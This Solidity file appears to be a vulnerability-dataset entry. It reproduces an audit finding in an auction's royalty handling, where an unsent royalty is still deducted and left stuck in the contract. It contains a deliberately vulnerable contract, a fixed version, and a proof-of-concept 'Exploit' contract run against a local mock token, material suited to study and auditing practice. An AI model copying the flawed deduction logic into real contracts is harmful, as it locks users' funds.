// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

/*
 * AuditVault 57636 — Onemind PlatformAuction.handleRoyalties (Zokyo, 2022-10).
 * _calculateRoyalty returns address(0) after the collection owner renounces.
 * _currencyTransfer refuses the zero address, but handleRoyalties still
 * subtracts the royalty from the price, so that value stays in the auction.
 */

contract MiniToken {
    string public name = "Sale";
    string public symbol = "SALE";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _move(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _move(from, to, amount);
        return true;
    }

    function _move(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract PlatformAuction {
    MiniToken public immutable currency;
    address public collectionOwner;
    address public seller;
    uint256 public lastRoyalty;
    bool public lastSent;
    uint256 public lastProceeds;

    constructor(MiniToken _currency, address _seller) {
        currency = _currency;
        collectionOwner = msg.sender;
        seller = _seller;
    }

    function renounceOwner() external {
        collectionOwner = address(0);
    }

    function _calculateRoyalty(uint256 price) public view returns (address receiver, uint256 royalty) {
        royalty = price / 10;
        if (collectionOwner == address(0)) return (address(0), royalty);
        return (collectionOwner, royalty);
    }

    function _currencyTransfer(address receiver, uint256 amount) public returns (bool) {
        if (receiver == address(0)) return false;
        currency.transfer(receiver, amount);
        return true;
    }

    function handleRoyalties(uint256 price) public returns (uint256) {
        (address receiver, uint256 royalty) = _calculateRoyalty(price);
        bool sent = _currencyTransfer(receiver, royalty);
        lastRoyalty = royalty;
        lastSent = sent;
        // @> VULN: royalty is subtracted from price even though it was not transferred
        price -= royalty;
        lastProceeds = price;
        return price;
    }

    function settle(uint256 price) external {
        currency.transferFrom(msg.sender, address(this), price);
        uint256 proceeds = handleRoyalties(price);
        currency.transfer(seller, proceeds);
    }
}

contract PlatformAuctionFixed {
    MiniToken public immutable currency;
    address public collectionOwner;
    address public seller;
    uint256 public lastRoyalty;
    bool public lastSent;
    uint256 public lastProceeds;

    constructor(MiniToken _currency, address _seller) {
        currency = _currency;
        collectionOwner = msg.sender;
        seller = _seller;
    }

    function renounceOwner() external {
        collectionOwner = address(0);
    }

    function _calculateRoyalty(uint256 price) public view returns (address receiver, uint256 royalty) {
        royalty = price / 10;
        if (collectionOwner == address(0)) return (address(0), royalty);
        return (collectionOwner, royalty);
    }

    function _currencyTransfer(address receiver, uint256 amount) public returns (bool) {
        if (receiver == address(0)) return false;
        currency.transfer(receiver, amount);
        return true;
    }

    function handleRoyalties(uint256 price) public returns (uint256) {
        (address receiver, uint256 royalty) = _calculateRoyalty(price);
        bool sent = _currencyTransfer(receiver, royalty);
        lastRoyalty = royalty;
        lastSent = sent;
        if (sent) price -= royalty;
        lastProceeds = price;
        return price;
    }

    function settle(uint256 price) external {
        currency.transferFrom(msg.sender, address(this), price);
        uint256 proceeds = handleRoyalties(price);
        currency.transfer(seller, proceeds);
    }
}

contract Exploit {
    address internal constant SELLER = 0x0000000000000000000000000000000000005e11;
    uint256 public constant PRICE = 1000 ether;

    MiniToken public currency;
    PlatformAuction public auction;
    uint256 public stuck;
    uint256 public sellerGot;
    uint256 public royalty;
    bool public sent;

    constructor() {
        currency = new MiniToken();
        auction = new PlatformAuction(currency, SELLER);
    }

    function run() external {
        currency.mint(address(this), PRICE);
        currency.approve(address(auction), PRICE);
        auction.renounceOwner();
        address ownerNow = auction.collectionOwner();
        auction.settle(PRICE);
        royalty = auction.lastRoyalty();
        sent = auction.lastSent();
        stuck = currency.balanceOf(address(auction));
        sellerGot = currency.balanceOf(SELLER);
        require(ownerNow == address(0), "renounced");
        require(royalty == 100 ether, "royalty");
        require(sent == false, "not sent");
        require(sellerGot == 900 ether, "seller");
        require(stuck == 100 ether, "stuck");
    }
}
